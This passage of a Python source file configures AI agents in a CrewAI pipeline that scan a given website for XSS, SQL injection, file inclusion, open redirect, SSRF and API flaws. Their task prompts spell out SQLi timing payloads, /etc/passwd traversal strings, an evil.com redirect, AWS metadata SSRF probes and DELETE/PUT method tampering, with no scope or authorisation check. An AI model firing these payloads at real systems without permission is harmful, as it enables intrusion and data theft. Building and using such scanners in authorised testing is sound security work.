Step 1 — Evidence Verification per type:
  XSS: REQUIRE payload reflected in executable context (check body_snippet). DISCARD if HTML-encoded or in comment.
  SQLi: REQUIRE DB error in body_snippet, time delay >=4s, or SQLMap "is vulnerable". DISCARD if no error/timing.
  LFI: REQUIRE file content in body_snippet (root:x:0:0 or [extensions]). DISCARD if 404 or no content.
  Open Redirect: REQUIRE 3xx status + Location header pointing to external domain in response_headers.
  SSRF: REQUIRE internal content in body_snippet OR interactsh ssrf_confirmed=true. DISCARD if URL just reflected without server-side fetch evidence.
  DOM XSS: REQUIRE actual JavaScript code citation showing source-to-sink flow AND reflected:false. DISCARD if agent only guessed without citing code.
  API: REQUIRE data without auth or mass assignment accepted. DISCARD if 401/403.
Step 2 — Severity Assignment:
  CRITICAL: SQLi with data extraction, LFI reading system files, SSRF with cloud metadata, Broken Auth
  HIGH: Reflected XSS, Blind SQLi confirmed, SSRF with callback or internal content, DOM XSS with cited code flow
  MEDIUM: Open Redirect confirmed with 3xx, API docs exposure, SSRF without full confirmation
  LOW: Verbose errors, Self-XSS
  DISCARD: Unconfirmed/potential findings, guessed vulnerabilities without tool evidence
Step 3 — Deduplicate — same vuln on same parameter = one entry.
Step 4 — Output ONLY a raw JSON array. No markdown, no backticks, no preamble.
Each object: {"type":"","name":"","severity":"Critical|High|Medium|Low","location":"","description":"","evidence":""}''',
    llm=llm_flash,
    tools=[],
    allow_delegation=False,
    verbose=True
)

# 4. Detailed Tasks

recon_task = Task(
    description='''Perform FAST reconnaissance on {target_url}:
1. Run load_crawl_data on {target_url} to get ALL pre-discovered endpoints, parameters, and forms from the deep crawler.
2. Run historical_urls on the domain to find deleted/hidden endpoints from archives.
3. Analyze technology stack from the crawl data headers (server, cookies, x-powered-by).
4. Quickly categorize every discovered parameter as HIGH/MEDIUM/LOW value for each vulnerability type.
Output a structured technical map listing every endpoint URL with its parameters. Be concise — just list the data, no lengthy analysis.''',
    expected_output="A structured attack surface map with endpoints, parameters, forms, technology stack, and vulnerability type recommendations.",
    agent=recon_specialist
)

xss_task = Task(
    description='''Test {target_url} for Cross-Site Scripting based on the recon report:
1. For each endpoint with parameters from recon, run kxss_reflection_check to find reflecting params.
2. For EVERY endpoint where kxss found reflection, run dalfox_xss_scan for deep automated XSS testing.
3. For any Dalfox findings, use active_payload_tester to manually verify the exact payload reflects.
4. Document each confirmed XSS with: parameter name, injection context, payload used, and evidence.''',
    expected_output="List of verified XSS vulnerabilities with parameter, payload, context, and reflection evidence.",
    agent=xss_agent,
    context=[recon_task]
)

sqli_task = Task(
    description='''Test {target_url} for SQL Injection based on the recon report:
1. Identify all endpoints with query parameters (especially id, search, user, category, sort, filter).
2. For GET endpoints: run sqlmap_scan with the full URL including query parameters.
3. For POST forms (login, search, feedback): run sqlmap_scan with url= set to the form action URL, data= set to the form fields (e.g. "uid=test&passw=test"), and method="POST".
4. If SQLMap reports "is vulnerable", extract the DBMS type and payload from the output.
5. If SQLMap finds nothing, use active_payload_tester to send a single quote (') and check body_snippet for SQL error messages.
6. As a last resort, test time-based: send "1' OR SLEEP(5)-- -" and check if the "time" field shows > 5s.''',
    expected_output="List of verified SQLi vulnerabilities with injection type, DBMS, and working payload.",
    agent=sqli_agent,
    context=[recon_task]
)

lfi_task = Task(
    description='''Test {target_url} for LFI and Open Redirect based on the recon report:
1. Identify parameters suggesting file handling (page, file, doc, path, template, include, lang, view, content, cfile).
2. For each file parameter, run ffuf_lfi_fuzz with the parameter name.
3. Manually verify hits using active_payload_tester — check the body_snippet field for "root:x:0:0:", "[extensions]", or "<web-app".
4. If you get 500 errors with path traversal payloads, try encoding bypasses (....//....//etc/passwd, ..%2f..%2f, ..%252f).
5. For redirect parameters (url, redirect, next, dest, return, goto), test Open Redirect:
   Use active_payload_tester with payload "https://evil.com" — check response_headers for Location header.''',
    expected_output="List of verified LFI and Open Redirect vulnerabilities with payload and file content evidence from body_snippet.",
    agent=lfi_agent,
    context=[recon_task]
)

ssrf_task = Task(
    description='''Test {target_url} for SSRF based on the recon report:
1. Identify parameters that accept URLs or hostnames (url, link, src, fetch, proxy, webhook, callback, preview, image_url, HostName, host).
2. For each URL/host parameter, run interactsh_ssrf_test with the parameter name.
3. If interactsh confirms callback (ssrf_confirmed=true), report as CONFIRMED BLIND SSRF.
4. Use active_payload_tester to inject http://169.254.169.254/latest/meta-data/ — check body_snippet for AWS metadata. If found = CRITICAL.
5. Try internal ports: inject http://127.0.0.1:22, :3306, :6379 and compare content_length values across responses.
6. IMPORTANT: "reflected":true alone does NOT prove SSRF — you MUST check body_snippet for actual fetched content from internal services.''',
    expected_output="List of verified SSRF vulnerabilities with callback evidence or body_snippet showing internal content.",
    agent=ssrf_agent,
    context=[recon_task]
)

dom_xss_task = Task(
    description='''Analyze {target_url} for DOM-based XSS:
1. Use fetch_site_data on EACH page with parameters to get the full HTML and JavaScript (returned in the "body" field).
2. Read the "body" field and search the actual JavaScript code for SOURCES: location.hash, location.search, document.URL, document.referrer, window.name.
3. Search the actual JavaScript code for SINKS: innerHTML, document.write, eval(), setTimeout(string), jQuery .html().
4. If a source feeds directly into a sink without DOMPurify sanitization, cite the exact JavaScript code line and construct a trigger URL.
5. Use active_payload_tester to send the trigger URL. If "reflected": false but the source-to-sink flow exists in the code, it's DOM XSS.
6. You MUST cite the actual JavaScript code from the body that shows the vulnerable flow. Do NOT guess or assume.''',
    expected_output="List of DOM XSS vulnerabilities with cited source code, source, sink, code flow, and trigger URL.",
    agent=dom_xss_agent,
    context=[recon_task]
)

api_task = Task(
    description='''Test {target_url} API endpoints for security issues:
1. From recon, identify /api/, /v1/, /v2/, /rest/, /graphql endpoints.
2. Use fetch_site_data to probe /swagger.json, /openapi.json, /api-docs for exposed documentation.
3. Use arjun_param_discovery on API endpoints to find hidden parameters.
4. Use active_payload_tester to test auth bypass: send requests without auth headers — if 200 with data, it's broken auth.
5. Test method tampering: send DELETE/PUT requests to read-only endpoints.''',
    expected_output="List of API vulnerabilities: broken auth, exposed docs, hidden params, method tampering.",
    agent=api_agent,
    context=[recon_task]
)

report_task = Task(
    description='''Review ALL findings from the attack agents. Do NOT run any tools.
1. For each finding, verify evidence exists (payload + server response). Discard findings without proof.
2. Assign severity: Critical (SQLi+data, SSRF+metadata, Broken Auth), High (Reflected XSS, Blind SQLi, DOM XSS), Medium (Open Redirect, API docs), Low (verbose errors).
3. Deduplicate — same vuln on same parameter = one entry.
4. Output ONLY a raw JSON array. No markdown, no backticks, no explanation.
Each object MUST have: "type", "name", "severity", "location", "description", "evidence".''',
    expected_output='A raw JSON array of verified vulnerabilities. Example: [{"type":"XSS","name":"Reflected XSS in search","severity":"High","location":"https://target.com/search?q=PAYLOAD","description":"...","evidence":"..."}]',
    agent=validator_agent,
    context=[xss_task, sqli_task, lfi_task, ssrf_task, dom_xss_task, api_task]
)

# 5. Main
def main():
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Target URL missing"}))
        return
    
    target = sys.argv[1]
    crew = Crew(
        agents=[recon_specialist, xss_agent, sqli_agent, lfi_agent, ssrf_agent, dom_xss_agent, api_agent, validator_agent],
        tasks=[recon_task, xss_task, sqli_task, lfi_task, ssrf_task, dom_xss_task, api_task, report_task],
        process=Process.sequential,
        verbose=True,
        max_rpm=30
    )

    try:
        original_stdout = sys.stdout
        sys.stdout = sys.stderr
        result = crew.kickoff(inputs={'target_url': target})
        res_str = str(result).strip()
        sys.stdout = original_stdout
        
        start = res_str.find('[')
        end = res_str.rfind(']')
        if start != -1 and end != -1:
            print("---JSON_START---")
            print(res_str[start:end+1])
            print("---JSON_END---")
        else:
            print("---JSON_START---")
            print(json.dumps([{"type": "Info", "name": "Scan Complete", "severity": "Info", "location": target, "description": res_str[:1000], "evidence": ""}]))
            print("---JSON_END---")
    except Exception as e:
        print("---JSON_START---")
        print(json.dumps([{"type": "Error", "name": "System Failure", "severity": "High", "location": target, "description": str(e), "evidence": "None"}]))
        print("---JSON_END---")

if __name__ == "__main__":
    main()
